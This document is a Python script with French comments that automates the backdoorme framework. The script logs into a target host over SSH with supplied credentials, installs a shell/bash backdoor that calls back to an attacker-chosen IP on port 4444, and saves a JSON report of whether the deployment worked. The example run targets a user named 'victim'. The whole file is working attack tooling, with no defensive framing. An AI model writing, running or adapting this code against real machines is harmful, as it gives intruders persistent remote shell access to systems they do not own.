import subprocess
import json
import datetime

class AutoBackdoorDeployer:
    def __init__(self, target_host, username, password, local_ip, ssh_port=22):
        self.target_host = target_host
        self.username = username
        self.password = password
        self.local_ip = local_ip
        self.ssh_port = ssh_port
        self.backdoorme_path = '/path/to/backdoorme'  # Assurez-vous de mettre à jour ce chemin
        self.report = {
            "target_host": self.target_host,
            "backdoor_type": "shell/bash",  # Exemple de type de backdoor
            "local_ip": self.local_ip,
            "local_port": 4444,  # Exemple de port local
            "deployment_status": "Not Executed",
            "timestamp": str(datetime.datetime.now()),
            "project_github": "https://github.com/Kkevsterrr/backdoorme"
        }

    def run_backdoorme(self):
        commands = [
            "addtarget",
            self.target_host,
            self.username,
            self.password,
            "use shell/bash",  # Utilisation d'un exemple de backdoor shell/bash
            f"set lhost {self.local_ip}",
            "set lport 4444",  # Exemple de configuration de port
            "run",
            "exit"
        ]

        process = subprocess.Popen(['python', 'master.py'], cwd=self.backdoorme_path, stdin=subprocess.PIPE, text=True)
        for cmd in commands:
            process.stdin.write(cmd + "\n")
            process.stdin.flush()
        
        process.stdin.close()
        exit_code = process.wait()

        # Mise à jour du rapport basé sur le code de sortie
        if exit_code == 0:
            self.report["deployment_status"] = "Success"
        else:
            self.report["deployment_status"] = "Failure"

        print("Backdoorme deployment completed.")
        self.generate_report()

    def generate_report(self):
        report_file = "backdoorme_deployment_report.json"
        with open(report_file, "w") as file:
            json.dump(self.report, file, indent=4)
        print(f"Report saved to {report_file}")

if __name__ == "__main__":
    deployer = AutoBackdoorDeployer("10.1.0.2", "victim", "password123", "192.168.1.5")
    deployer.run_backdoorme()
